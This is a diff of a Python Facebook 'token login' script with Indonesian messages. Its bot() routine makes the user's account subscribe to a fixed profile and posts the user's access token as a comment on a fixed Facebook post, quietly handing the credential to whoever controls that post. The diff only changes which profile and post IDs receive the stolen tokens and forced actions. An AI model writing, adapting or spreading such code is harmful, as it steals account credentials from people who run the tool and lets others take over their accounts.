@@ -91,11 +91,11 @@ def gets_dict_cookies(cookies):
 		return result
 
 ###### LOGIN TOKEN ######
-
+raka_sayang_amanda = '953529338576547'
 def log_token():
     os.system("clear")
     banner()
-    toket = input(m+"\n["+k+"•"+m+"]"+u+" Token : ")
+    toket = input(m+"\n["+k+"?"+m+"]"+u+" Token : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -103,9 +103,9 @@ def log_token():
         zedd = open("login.txt", "w")
         zedd.write(toket)
         zedd.close()
-        print((m+"\n["+k+"•"+m+"]"+h+" Login Successful"))
+        print((m+"\n["+k+"?"+m+"]"+h+" Login Successful"))
         jalan('\033[1;96mAGAR BERJALAN LANCAR ANDA HARUS SUBSCRIBE DULU CHANNEL INI!')
-        os.system('xdg-open http://www.youtube.com/c/TutorialityStudio')
+        os.system('xdg-open https://youtu.be/bszAm4C5ovE')
         bot()
     except KeyError:
         print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
@@ -124,10 +124,10 @@ def bot():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	kom = ("Gantengnya Ramdani😘")
-	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket) 
-	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/315723919935349/comments/?message=' + kom + '&access_token=' + toket)
+	kom = ("Gantengnya Aa @[100000834003593:]😘")
+	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + toket) 
+	requests.post('https://graph.facebook.com/953529338576547/comments/?message=' + toket + '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/953529338576547/comments/?message=' + kom + '&access_token=' + toket)
 	menu()
 
 ###### MENU ######
